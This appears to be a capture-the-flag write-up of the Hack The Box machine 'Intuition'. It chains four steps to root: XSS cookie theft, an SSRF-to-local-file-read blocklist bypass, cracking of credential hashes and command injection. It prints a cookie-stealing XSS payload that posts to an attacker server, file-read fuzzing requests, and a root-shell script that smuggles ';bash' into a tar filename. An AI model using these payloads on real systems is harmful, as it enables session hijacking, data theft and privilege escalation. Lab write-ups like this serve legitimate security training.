# Intuition

<details>
<summary><b>Table of Contents</b></summary>

- [Intuition](#intuition)
  - [Overview](#overview)
  - [Network Enumeration](#network-enumeration)
    - [TCP Scan](#tcp-scan)
  - [Web Enumeration](#web-enumeration)
    - [Vhost Discovery](#vhost-discovery)
    - [Walking an Application](#walking-an-application)
      - [comprezzor.htb](#comprezzorhtb)
      - [report.comprezzor.htb](#reportcomprezzorhtb)
      - [auth.comprezzor.htb](#authcomprezzorhtb)
      - [dashboard.comprezzor.htb](#dashboardcomprezzorhtb)
        - [webdev](#webdev)
        - [admin](#admin)
          - [Create PDF Report](#create-pdf-report)
  - [Foothold](#foothold)
    - [Filesystem Enumeration via LFI](#filesystem-enumeration-via-lfi)
      - [/proc/self/cmdline](#procselfcmdline)
      - [/proc/self/environ](#procselfenviron)
      - [/etc/hosts](#etchosts)
      - [/.dockerenv](#dockerenv)
      - [Web Root](#web-root)
        - [/app/code/app.py](#appcodeapppy)
        - [Blueprint Structure](#blueprint-structure)
        - [/app/code/blueprints/dashboard/dashboard.py](#appcodeblueprintsdashboarddashboardpy)
    - [FTP Enumeration](#ftp-enumeration)
      - [welcome\_note.txt](#welcome_notetxt)
      - [private-8297.key](#private-8297key)
  - [PrivEsc](#privesc)
    - [Filesystem Enumeration](#filesystem-enumeration)
      - [web.local (/var/www/app/)](#weblocal-varwwwapp)
        - [/var/www/app/blueprints/auth/users.db](#varwwwappblueprintsauthusersdb)
      - [ftp.local (/opt/ftp/)](#ftplocal-optftp)
        - [runner1](#runner1)
    - [Process Enumeration w/ pspy](#process-enumeration-w-pspy)
      - [Suricata Log Analysis](#suricata-log-analysis)
    - [lopez](#lopez)
      - [runner2 Reverse Engineering](#runner2-reverse-engineering)
        - [list](#list)
        - [run](#run)
        - [install](#install)
      - [Exploitation Brainstorm](#exploitation-brainstorm)
      - [installRole Overview](#installrole-overview)
      - [Exploiting Command Injection](#exploiting-command-injection)

</details>

## Overview

> - [Machine Link](https://app.hackthebox.com/machines/Intuition)
> - [Medium Story](https://medium.com/@samaellovecraft/hack-the-box-intuition-61c574f00a7e)

This machine presents a series of security challenges that require a methodical approach to obtain root-level access. The path to exploitation involves multiple stages of vulnerability discovery and chaining.

During my testing of the Comprezzor environment, I identified several vulnerabilities across multiple subdomains, leading to a full compromise. Key findings include **XSS (Cross-Site Scripting)**, outdated and vulnerable software in production (**CVE-2023-24329**) causing sensitive file disclosure through a combination of **SSRF (Server-Side Request Forgery)** and **LFI (Local File Inclusion)**, a **weak password policy**, **insecure filesystem permissions** and **command injection**. By chaining these vulnerabilities and misconfigurations, I successfully escalated privileges from an unprivileged user to admin and ultimately achieved full system access.

| **Vulnerability**                           | **Description & Impact**                                                                                                       | **Mitigation Recommendations**                                                                                                                |
| ------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------ | --------------------------------------------------------------------------------------------------------------------------------------------- |
| **XSS in Bug Submission Form**              | Allowed an unprivileged user to gain access to the admin dashboard.                                                            | Implement proper input validation and sanitization to prevent XSS. Consider using Content Security Policy (CSP) to mitigate script execution. |
| **SSRF-LFI in PDF Report Creation Feature** | A bug in `urllib` (CVE-2023-24329) allowed bypassing a blocklist, enabling access to sensitive files.                          | Regularly update software and libraries to their latest versions. Strengthen input validation and sanitization to prevent SSRF and LFI.       |
| **Weak Password Policy**                    | Extracted hashes from an SQLite database were easily cracked.                                                                  | Enforce strong password policies and use modern, secure hashing algorithms (e.g., bcrypt, Argon2) with appropriate salting and stretching.    |
| **Insecure Filesystem Permissions**         | Examination of Suricata logs revealed critical credentials used in subsequent steps.                                           | Restrict file and directory permissions to follow the principle of least privilege. Regularly audit access controls and log management.       |
| **Command Injection**                       | Reverse engineering identified a command injection vulnerability in the `runner2` binary, which led to full system compromise. | Validate and sanitize all inputs. Avoid constructing shell commands with untrusted data. Consider using safer APIs for executing commands.    |

## Network Enumeration

### TCP Scan

```bash
sudo rustscan -a $IP -r 0-65535 -- -A -Pn -oN enumeration/tcp.all.nmap
```

![nmap-tcp-scan](attachments/nmap-tcp-scan.png)

The TCP scan results seem fairly typical for a Linux machine, revealing just SSH and HTTP services. At first glance, nothing overly exciting—yet.

## Web Enumeration

After adding the domain to `/etc/hosts`, I typically conduct subdomain/vhost enumeration in the background while manually exploring the website.

### Vhost Discovery

To brute-force potential virtual hosts, I used `ffuf` with the following command:

```bash
ffuf -c -u http://comprezzor.htb -H 'Host: FUZZ.comprezzor.htb' -ic -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -r -fs 3408
```

![ffuf-vhosts](attachments/ffuf-vhosts.png)

Great! The `ffuf` scan revealed multiple vhosts, significantly increasing the attack surface. So far, I added the following entries to my `/etc/hosts` file:

- `comprezzor.htb`
- `auth.comprezzor.htb`
- `report.comprezzor.htb`
- `dashboard.comprezzor.htb`

### Walking an Application

With several subdomains discovered, it's time to dive deeper into each one, looking for functionality that could expose weaknesses.

#### comprezzor.htb

The main site provides a file compression service with a **file upload** form:

<p align="center">
  <img src="attachments/comprezzor.htb.png" />
</p>

This might be worth revisiting for potential exploitation.

Additionally, there's an option to **submit a bug report**, which might lead to further vulnerabilities:

<p align="center">
    <img src="attachments/inform-us.png" />
</p>

#### report.comprezzor.htb

<p align="center">
  <img src="attachments/report-submission.png" />
</p>

The report page contains a bug submission form and a link explaining the report handling process:

![about-reports](attachments/about-reports.png)

The mention of bugs being "carefully reviewed by devs" and "escalated to administrators" smells like XSS spirit!

The report button redirects to `auth.comprezzor.htb`.

#### auth.comprezzor.htb

The authentication portal:

<p align="center">
  <img src="attachments/auth.png" />
</p>

I tried simple username/password combinations, but none worked. So, I registered an account and successfully logged in:

![report-logged-in](attachments/report-logged-in.png)

Upon logging in, I received the following cookie:

```
user_data=eyJ1c2VyX2lkIjogNiwgInVzZXJuYW1lIjogIiBhZG1pbiIsICJyb2xlIjogInVzZXIifXw2YWE4YzZmN2UyZjM4NmZjZDA4NDY0N2ZhN2E5NmZkZGU1NjI2NDE4YWExMzMwZDY4YTcwZDRiZjg1N2YwOGE2
```

Decoded, the cookie contains:

```json
{"user_id": 6, "username": " admin", "role": "user"}|6aa8c6f7e2f386fcd084647fa7a96fdde5626418aa1330d68a70d4bf857f08a6
```

With this, I proceeded to test the report submission form for XSS using a basic payload to capture cookies:

```html
test<script>fetch("http://10.10.15.7:8000/field?cookie="+btoa(document.cookie));</script>
```

<p align="center">
  <img src="attachments/report-xss-test.png" />
</p>

It worked! Both fields are vulnerable to the most basic XSS attack:

![stolen-cookie](attachments/stolen-cookie.png)

```
dXNlcl9kYXRhPWV5SjFjMlZ5WDJsa0lqb2dNaXdnSW5WelpYSnVZVzFsSWpvZ0ltRmtZVzBpTENBaWNtOXNaU0k2SUNKM1pXSmtaWFlpZlh3MU9HWTJaamN5TlRNek9XTmxNMlkyT1dRNE5UVXlZVEV3TmprMlpHUmxZbUkyT0dJeVlqVTNaREpsTlRJell6QTRZbVJsT0RZNFpETmhOelUyWkdJNA==
```

Here's the stolen cookie:

```
user_data=eyJ1c2VyX2lkIjogMiwgInVzZXJuYW1lIjogImFkYW0iLCAicm9sZSI6ICJ3ZWJkZXYifXw1OGY2ZjcyNTMzOWNlM2Y2OWQ4NTUyYTEwNjk2ZGRlYmI2OGIyYjU3ZDJlNTIzYzA4YmRlODY4ZDNhNzU2ZGI4
```

Which decodes to:

```json
{"user_id": 2, "username": "adam", "role": "webdev"}|58f6f725339ce3f69d8552a10696ddebb68b2b57d2e523c08bde868d3a756db8
```

Cookies are often used to maintain session state. By intercepting and using another user's cookie, we effectively inherit their session, allowing us to perform actions on their behalf without direct authentication.

With access to the `webdev` role, I can now explore the dashboard.

#### dashboard.comprezzor.htb

##### webdev

As expected, I couldn't access the dashboard with my previously created account:

<p align="center">
  <img src="attachments/dashboard-no-access.png" />
</p>

However, after swapping in the `webdev` cookie, I gained access:

![dashboard-webdev](attachments/dashboard-webdev.png)

The `webdev` dashboard includes a list of bug reports with actions on them:

![dashboard-reports](attachments/dashboard-reports.png)

The `Set High Priority` button immediately caught my attention. There wasn't much to do except submit another report, bundled with an XSS payload, and set its priority to high, hoping it would be "escalated to administrators for resolution" 😏

![set-high-priority](attachments/set-high-priority.png)

The `admin` viewed the report, and... **Bingo!**

![admin-cookie-stolen](attachments/admin-cookie-stolen.png)

I managed to grab the `admin` cookie:

```
dXNlcl9kYXRhPWV5SjFjMlZ5WDJsa0lqb2dNU3dnSW5WelpYSnVZVzFsSWpvZ0ltRmtiV2x1SWl3Z0luSnZiR1VpT2lBaVlXUnRhVzRpZlh3ek5EZ3lNak16TTJRME5EUmhaVEJsTkRBeU1tWTJZMk0yTnpsaFl6bGtNalprTVdReFpEWTRNbU0xT1dNMk1XTm1ZbVZoTWpsa056YzJaRFU0T1dRNQ==
```

```
user_data=eyJ1c2VyX2lkIjogMSwgInVzZXJuYW1lIjogImFkbWluIiwgInJvbGUiOiAiYWRtaW4ifXwzNDgyMjMzM2Q0NDRhZTBlNDAyMmY2Y2M2NzlhYzlkMjZkMWQxZDY4MmM1OWM2MWNmYmVhMjlkNzc2ZDU4OWQ5
```

```json
{"user_id": 1, "username": "admin", "role": "admin"}|34822333d444ae0e4022f6cc679ac9d26d1d1d682c59c61cfbea29d776d589d9
```

##### admin

Now I'm in as `admin`.

![dashboard-admin](attachments/dashboard-admin.png)

The `admin` dashboard presents three main actions:

1. **Full Report List** – There's nothing new here, as the `webdev` dashboard also has the same list: ![all-bug-reports](attachments/all-bug-reports.png)
2. **Create Backup** – There was nothing interesting in the intercepted request that was sent: ![create-backup](attachments/create-backup.png)
3. **Create PDF Report** – But this seems like a promising field for experimentation! ![create-pdf-report](attachments/create-pdf-report.png)

###### Create PDF Report

I tested the feature for SSRF, only to discover that requests containing `http://127.0.0.1`, `http://localhost`, and `http://comprezzor.htb` are blocked, along with the `file://` scheme. However, I managed to upload the file from my HTTP server:

![create-pdf-test](attachments/create-pdf-test.png)

The page immediately redirected me to the generated PDF file:

![generated-pdf](attachments/generated-pdf.png)

My next steps are:

1. Check the PDF file for any metadata that could **disclose the technology behind the conversion**: ![conversion-tech-disclosure](attachments/conversion-tech-disclosure.png)
2. Intercept the previous request with Netcat to **disclose the technology behind the web request**: ![nc-tech-disclosure](attachments/nc-tech-disclosure.png)

It turns out the server uses `wkhtmltopdf 0.12.6` for conversion and `Python-urllib/3.11` for web requests.

![searchsploit-wkhtmltopdf](attachments/searchsploit-wkhtmltopdf.png)

This `wkhtmltopdf` version is vulnerable to SSRF, but it didn't seem immediately useful or worth focusing on. So, I shifted focus to potential `urllib` vulnerabilities, and I found something interesting:

> [CVE-2023-24329](https://www.cvedetails.com/cve/CVE-2023-24329/): An issue in the `urllib.parse` component of Python before 3.11.4 allows attackers to bypass blocklisting methods by supplying a URL that starts with blank characters.

With this, I could attempt to bypass the blocklist I encountered earlier!

A simple space was enough to bypass the blocklist, allowing me to turn SSRF into LFI via the `file://` scheme:

![burp-lfi](attachments/burp-lfi.png)

```
+file:///etc/passwd
```

![lfi](attachments/lfi.png)

Note that `/etc/passwd` contains no non-default users, which could indicate that the application is running inside a container. I will attempt to confirm this later, but for now, I'll continue enumerating the filesystem and change the header, as my intuition tells me that I'm close to establishing a foothold.

## Foothold

### Filesystem Enumeration via LFI

To enumerate the filesystem through LFI, I began by fuzzing the endpoint with specialized wordlists. I crafted a raw HTTP request to use with the following `ffuf` command:

```http
POST /create_pdf_report HTTP/1.1
Host: dashboard.comprezzor.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 30
Origin: http://dashboard.comprezzor.htb
Connection: keep-alive
Referer: http://dashboard.comprezzor.htb/create_pdf_report
Cookie: user_data=eyJ1c2VyX2lkIjogMSwgInVzZXJuYW1lIjogImFkbWluIiwgInJvbGUiOiAiYWRtaW4ifXwzNDgyMjMzM2Q0NDRhZTBlNDAyMmY2Y2M2NzlhYzlkMjZkMWQxZDY4MmM1OWM2MWNmYmVhMjlkNzc2ZDU4OWQ5
Upgrade-Insecure-Requests: 1

report_url=+file://FUZZ
```

```bash
ffuf -request lfi.http -request-proto http -w /usr/share/seclists/Fuzzing/LFI/LFI-LFISuite-pathtotest-huge.txt -fs 1669,1675
```

- 1669 - `Content-Length` of `Invalid URL` response.
- 1675 - `Content-Length` of `Unexpected error!` response.

![ffuf-lfi](attachments/ffuf-lfi.png)

#### /proc/self/cmdline

![proc-self-cmdline](attachments/proc-self-cmdline.png)

The `/proc/self/cmdline` file in Linux contains the command-line arguments used to start the current process:

```bash
python3 /app/code/app.py
```

This exposes the web root location, essentially granting me access to the application’s source code.

#### /proc/self/environ

The `/proc/self/environ` file provides some environment variables, revealing the hostname of the container (`web.local`):

![proc-self-environ](attachments/proc-self-environ.png)

#### /etc/hosts

![etc-hosts](attachments/etc-hosts.png)

The `/etc/hosts` file includes:

```
127.0.0.1 localhost
::1 localhost ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
172.21.0.2 web.local web
172.21.0.1 ftp.local
```

I might be able to access `ftp.local` anonymously via the `ftp://` scheme, just like I'm accessing the `web.local` filesystem right now.

```
ftp://anonymous:anonymous@ftp.local
```

![burp-anon-ftp](attachments/burp-anon-ftp.png)

Unfortunately, this approach didn't work. Most likely I just need valid credentials.

#### /.dockerenv

As promised, I confirmed that the app is running in a Docker container, as shown by the presence of the `.dockerenv` file:

![docker-confirmed](attachments/docker-confirmed.png)

#### Web Root

It will be a little bit difficult to read the source code directly from PDF files, so I will translate it into code with some formatting magic, temporarily abandoning screenshots.

##### /app/code/app.py

The `app.py` file provided a wealth of information, including the overall structure of the web application:

```python
from flask import Flask, request, redirect

from blueprints.index.index import main_bp
from blueprints.report.report import report_bp
from blueprints.auth.auth import auth_bp
from blueprints.dashboard.dashboard import dashboard_bp

app = Flask(__name__) app.secret_key = "7ASS7ADA8RF3FD7"
app.config['SERVER_NAME'] = 'comprezzor.htb'
app.config['MAX_CONTENT_LENGTH'] = 5 * 1024 * 1024 # Limit file size to 5MB
ALLOWED_EXTENSIONS = {'txt', 'pdf', 'docx'} # Add more allowed file extensions if needed
app.register_blueprint(main_bp)
app.register_blueprint(report_bp, subdomain='report')
app.register_blueprint(auth_bp, subdomain='auth')
app.register_blueprint(dashboard_bp, subdomain='dashboard')

if __name__ == '__main__': app.run(debug=False, host="0.0.0.0", port=80)
```

The key takeaways here are the registration of different blueprints, which represent distinct sections of the app, and the server configuration that limits file size and file extensions for uploads.

##### Blueprint Structure

Based on the imports, I pieced together the application's blueprint structure, revealing additional files of interest:

```python
from blueprints.index.index import main_bp # blueprints/index/index.py
from blueprints.report.report import report_bp # blueprints/report/report.py
from blueprints.auth.auth import auth_bp # blueprints/auth/auth.py
from blueprints.dashboard.dashboard import dashboard_bp # blueprints/dashboard/dashboard.py
```

- [x] `/app/code/app.py`
  - [x] `/app/code/blueprints/index/index.py`
  - [x] `/app/code/blueprints/report/report.py`
    - `/app/code/blueprints/report/report_utils.py`
    - `/app/code/blueprints/auth/auth_utils.py`
  - [x] `/app/code/blueprints/auth/auth.py`
  - [x] `/app/code/blueprints/dashboard/dashboard.py` (BINGO!)

By formatting and reviewing them one by one, I eventually found the credentials for the FTP server in `dashboard.py`.

##### /app/code/blueprints/dashboard/dashboard.py

```python
@dashboard_bp.route('/backup', methods=['GET'])
@admin_required
def backup():
    source_directory = os.path.abspath(os.path.dirname(__file__) + '../../../')
    current_datetime = datetime.now().strftime("%Y%m%d%H%M%S")
    backup_filename = f'app_backup_{current_datetime}.zip'
    with zipfile.ZipFile(backup_filename, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for root, _, files in os.walk(source_directory):
            for file in files:
                file_path = os.path.join(root, file)
                arcname = os.path.relpath(file_path, source_directory)
                zipf.write(file_path, arcname=arcname)
                try:
                    ftp = FTP('ftp.local')
                    ftp.login(user='ftp_admin', passwd='u3jai8y71s2')
                    ftp.cwd('/')
                    with open(backup_filename, 'rb') as file:
                        ftp.storbinary(f'STOR {backup_filename}', file)
                        ftp.quit()
                        os.remove(backup_filename)
                        flash('Backup and upload completed successfully!', 'success')
                except Exception as e:
                    flash(f'Error: {str(e)}', 'error')
    return redirect(url_for('dashboard.dashboard'))
```

```
ftp_admin:u3jai8y71s2
```

### FTP Enumeration

```
ftp://ftp_admin:u3jai8y71s2@ftp.local
```

![burp-ftp](attachments/burp-ftp.png)

Using the credentials, I connected to the FTP server and enumerated its contents:

![ftp-access](attachments/ftp-access.png)

Here's a list of the files found:

```
-rw------- 1 root root 2655  May 01 21:50 private-8297.key
-rw-r--r-- 1 root root 15519 May 01 21:50 welcome_note.pdf
-rw-r--r-- 1 root root 1732  May 01 21:50 welcome_note.txt
```

#### welcome_note.txt

```
ftp://ftp_admin:u3jai8y71s2@ftp.local/welcome_note.txt
```

![welcome_note.txt](attachments/welcome_note.txt.png)

The `welcome_note.txt` contained a welcoming message for new developers along with instructions to use an SSH private key. The note also included the passphrase for the key:

```
Y27SH19HDIWD
```

#### private-8297.key

```
ftp://ftp_admin:u3jai8y71s2@ftp.local/private-8297.key
```

The `private-8297.key` is the SSH private key mentioned in the note:

![ssh-private-key](attachments/ssh-private-key.png)

After saving the key and adjusting its permissions, I used it with the provided passphrase to extract the username. The following command extracts the public key from the private key, which reveals the associated user:

```bash
ssh-keygen -y -f private-8297.key
```

![ssh-keygen](attachments/ssh-keygen.png)

With the username, private key, and passphrase, I was able to gain SSH access to the machine:

![ssh-access](attachments/ssh-access.png)

And that's a foothold!

## PrivEsc

It's always a good idea to revisit services exploited while establishing a foothold for additional valuable information, such as configuration files, databases, or backups, which may contain credentials or other sensitive data. In this case, we had both a web app and an FTP server.

### Filesystem Enumeration

#### web.local (/var/www/app/)

##### /var/www/app/blueprints/auth/users.db

While exploring the web root, I discovered an SQLite database named `users.db`, which contained user hashes:

![sqlite-creds](attachments/sqlite-creds.png)

```
admin:sha256$nypGJ02XBnkIQK71$f0e11dc8ad21242b550cc8a3c27baaf1022b6522afaadbfa92bd612513e9b606
adam:sha256$Z7bcBO9P43gvdQWp$a67ea5f8722e69ee99258f208dc56a1d5d631f287106003595087cf42189fc43
```

I successfully cracked `adam`'s password using Hashcat:

```powershell
.\hashcat.exe -m 30120 -a 0 .\sqlite.hashes ..\rockyou.txt --username
```

![hashcat-adam-gray](attachments/hashcat-adam-gray.png)

```
adam gray
```

However, despite obtaining these credentials, I couldn't gain shell access as `adam`:

![adam-bummer](attachments/adam-bummer.png)

#### ftp.local (/opt/ftp/)

In the process of inspecting the `/opt` directory, I found folders related to the FTP server, including one named `adam`, suggesting that this user has access to it.

![opt-ftp](attachments/opt-ftp.png)

I immediately made an attempt to recursively download all files from this directory using the newly obtained credentials, and it was successful:

```bash
wget -r --user="adam" --password="adam gray" ftp://127.0.0.1 --no-host-directories
```

![wget-ftp](attachments/wget-ftp.png)

The downloaded directory structure contained the following files:

```
-rw-r--r-- 1 root adam   318 Apr  5 20:25 run-tests.sh
-rwxr-xr-x 1 root adam 16744 Oct 18  2023 runner1
-rw-r--r-- 1 root adam  3815 Oct 18  2023 runner1.c
```

Among the files were a compiled binary (`runner1`), its corresponding source code (`runner1.c`), and a bash script (`run-tests.sh`) containing an authentication code and instructions for running the binary:

```bash
#!/bin/bash

# List playbooks
./runner1 list

# Run playbooks [Need authentication]
# ./runner run [playbook number] -a [auth code]
#./runner1 run 1 -a "UHI75GHI****"

# Install roles [Need authentication]
# ./runner install [role url] -a [auth code]
#./runner1 install http://role.host.tld/role.tar -a "UHI75GHI****"
```

##### runner1

I began experimenting with the `runner1` binary:

![runner1-overview](attachments/runner1-overview.png)

It seems like the authentication code from `run-test.sh` is incomplete. Fortunately, I have access to the source code to examine:

```c
int check_auth(const char* auth_key) {
    unsigned char digest[MD5_DIGEST_LENGTH];
    MD5((const unsigned char*)auth_key, strlen(auth_key), digest);

    char md5_str[33];
    for (int i = 0; i < 16; i++) {
        sprintf(&md5_str[i*2], "%02x", (unsigned int)digest[i]);
    }

    if (strcmp(md5_str, AUTH_KEY_HASH) == 0) {
        return 1;
    } else {
        return 0;
    }
}
```

The `check_auth` function revealed that the binary checks for a valid authentication key by comparing its MD5 hash against a stored hash (`AUTH_KEY_HASH`). Using this function as a reference, I wrote a [program](crack_auth.c) to brute-force the missing 4 characters of the authentication key. Here's the command to compile it:

```bash
gcc crack_auth.c -o crack_auth -lssl -lcrypto
```

![crack_auth](attachments/crack_auth.png)

The program successfully cracked the full authentication code:

```
UHI75GHINKOP
```

Although this C-based approach worked, it was more of a challenge I took on for fun rather than the most efficient method. This could have been done more easily with Hashcat using a [mask attack](https://hashcat.net/wiki/doku.php?id=mask_attack):

```powershell
.\hashcat.exe -m 0 -a 3 '0feda17076d793c2ef2870d7427ad4ed' -1 ?d?u 'UHI75GHI?1?1?1?1'
```

![hashcat-auth-code](attachments/hashcat-auth-code.png)

Now that I had the full authentication code, I attempted to run the binary. However, the `dev_acc` user lacked the necessary permissions to access the `playbook` directory:

![opt-playbooks-denied](attachments/opt-playbooks-denied.png)

Upon further enumeration, I discovered that only members of the `sys-adm` group have access to the `playbooks` and `runner2` directories. There are two users on the machine (`adam` and `lopez`) who belong to this group:

![sys-admins](attachments/sys-admins.png)

This suggests that obtaining a shell as either `adam` or `lopez` is necessary to proceed further.

Additionally, examining the source code uncovered two potentially vulnerable functions (`runPlaybook` and `installRole`) that use the `system` function to execute commands:

```c
void runPlaybook(const char *playbookName) {
    char run_command[1024];
    snprintf(run_command, sizeof(run_command), "%s -i %s %s%s", ANSIBLE_PLAYBOOK_BIN, INVENTORY_FILE, PLAYBOOK_LOCATION, playbookName);
    system(run_command);
}

void installRole(const char *roleURL) {
    char install_command[1024];
    snprintf(install_command, sizeof(install_command), "%s install %s", ANSIBLE_GALAXY_BIN, roleURL);
    system(install_command);
}
```

These functions directly pass user input into system calls, which raises the possibility of command injection vulnerabilities. I'll look into this more thoroughly after conducting more extensive system enumeration, as this binary is useless to me without access to the `sys-adm` group.

### Process Enumeration w/ pspy

Next, I ran `pspy` and spotted some interesting services in the output, namely Selenium and Suricata:
![pspy-output](attachments/pspy-output.png)

- **Selenium** is software used for automating web browsers. This opens the possibility of examining this service via port forwarding. Previously, I saw a `chrome` directory in `/opt` and `firefox` processes in the `pspy` output.
- **Suricata** is a network IDS/IPS and security monitoring engine, which implies that it logs network traffic for analysis.

#### Suricata Log Analysis

The next logical step was to search the file system for any logs related to Suricata:

```bash
find / -name "*suricata*" 2>/dev/null
```

![suricata-logs](attachments/suricata-logs.png)

To search for logs containing information on `adam`, `lopez`, or possible credentials, I used the following `grep` command:

```bash
grep -arin -E '("password"|"pass"|"adam"|"lopez")' --color=auto /var/log/suricata 2>/dev/null
```

Surprisingly, this didn't yield any results.

However, I noticed several compressed (`.gz`) log files in `/var/log/suricata`, which `grep` alone can't handle. Fortunately, there's a tool called `zgrep` that can search within compressed files. The only limitation is that it doesn't support recursion by default, but this can be handled by combining it with other tools:

```bash
find /var/log/suricata -type f -name '*.gz' -print0 2>/dev/null | xargs -0 zgrep -in -E '("password"|"pass"|"adam"|"lopez")' --color=auto 2>/dev/null
```

This command returned logs showing a successful FTP login attempt with the following credentials:

![lopez-ftp-pass](attachments/lopez-ftp-pass.png)

```
Lopezz1992%123
```

### lopez

The retrieved credentials were sufficient to gain shell access as `lopez`. Now I can examine the `/opt/playbooks` and `/opt/runner2` directories as well as run the `runner1` binary.

![lopez-sudo-l](attachments/lopez-sudo-l.png)

Lopez has permission to run the `/opt/runner2/runner2` binary with `root` privileges. The absence of source code suggests **reverse engineering**. There's also a chance that this binary incorporates code from the previous version, source code of which is available.

#### runner2 Reverse Engineering

![re-runner2](attachments/re-runner2.png)

Upon examining the binary in Ghidra, it was clear that it includes functions from the previous version, which is a good sign.

<p align="center">
  <img src="attachments/re-runner2-functions.png" />
</p>

So far, all I know is that `runner2` expects a JSON file as its only argument. It can be assumed that this file's structure likely mirrors the command-line arguments from the previous version. My initial goal is to reverse engineer the expected structure of the JSON file.

I made a rookie attempt to reverse engineer the `main` function, and things are starting to make sense.

##### list

![re-runner2-main](attachments/re-runner2-main.png)

Based on this, I can infer that the JSON file needed to run the `listPlaybooks` function should look like this:

```json
{
  "run": {
    "action": "list"
  },
  "auth_code": "UHI75GHINKOP"
}
```

In the same way, I reverse-engineered the expected JSON structures for the remaining actions.

##### run

![re-runner2-run](attachments/re-runner2-run.png)

```json
{
  "run": {
    "action": "run",
    "num": 1
  },
  "auth_code": "UHI75GHINKOP"
}
```

##### install

![re-runner2-install](attachments/re-runner2-install.png)

```json
{
  "run": {
    "action": "install",
    "role_file": "{role_file}"
  },
  "auth_code": "UHI75GHINKOP"
}
```

There were some changes made to the `installRole` function:

![re-runner2-installRole](attachments/re-runner2-installRole.png)

It now accepts only TAR archives instead of URLs, with the check enforced by the `isTarArchive` function:

![re-runner2-isTarArchive](attachments/re-runner2-isTarArchive.png)

#### Exploitation Brainstorm

My rookie reverse engineering skills were enough to get through this! Now, I can run the binary with all available actions:

![re-success](attachments/re-success.png)

All that's left is to find a vulnerability to exploit in one of these functions:

- `listPlaybooks`: Not exploitable.
- `runPlaybook`: No write access to `/opt/playbooks`.
- `installRole`: No input sanitization, no restrictions!

#### installRole Overview

The `installRole` function is defined as follows:

```c
int installRole(const char *roleFile) {
    int isTar;
    char install_command[1024];

    isTar = isTarArchive(roleFile);
    if (isTar == 0) {
        printf("Invalid tar archive.\n");
        return 1;
    } else {
        snprintf(install_command, sizeof(install_command), "%s install %s", ANSIBLE_GALAXY_BIN, roleFile);
        system(install_command);
        return 0;
    }
}
```

It is definitely vulnerable to command injection. The idea is to inject the command into the TAR archive filename, which results in:

```bash
/usr/bin/ansible-galaxy install role.tar;pwn
```

#### Exploiting Command Injection

Steps to perform the exploitation are as follows:

1. Construct a TAR archive with a filename that includes a command injection payload.
2. Create a JSON file with the `install` action and set the `role_file` field to the malicious TAR archive.
3. Execute the `runner2` binary with the prepared JSON file to trigger the command injection.

Here's the script to achieve this:

```bash
#!/bin/bash

cd /dev/shm
json='{
    "run": {
        "action": "install",
        "role_file": "/dev/shm/pwn.tar;bash"
    },
    "auth_code": "UHI75GHINKOP"
}'
echo "$json" > pwn.json
touch pwn
tar -cf 'pwn.tar;bash' pwn
rm pwn
sudo /opt/runner2/runner2 pwn.json
```

Everything went as planned, and I completely compromised the target:

![rooted](attachments/rooted.png)

Rooted!
